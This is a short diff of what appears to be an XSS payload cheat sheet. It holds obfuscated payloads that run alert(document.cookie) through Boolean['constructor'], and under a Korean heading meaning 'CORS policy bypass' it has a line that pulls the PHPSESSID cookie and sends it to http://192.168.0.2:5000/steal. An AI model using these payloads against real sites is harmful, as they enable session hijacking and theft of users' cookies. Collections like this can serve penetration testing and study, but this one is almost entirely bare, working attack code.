@@ -12,6 +12,7 @@ Boolean['constructor']('a' + 'l' + 'e' + 'r' + 't' + '(1)')();
 
 Boolean['constructor']('a'+'l'+'e'+'r'+'t'+'('+'d'+'o'+'c'+'u'+'m'+'e'+'n'+'t'+'.'+'c'+'o'+'o'+'k'+'i'+'e'+')')();
 
+
 # CORS 정책 우회
 ;const img=new Image();img.src='http://192.168.0.2:5000/steal?PHPSESSID='+document.cookie.match(/PHPSESSID=([^;]+)/)[1];//'
 
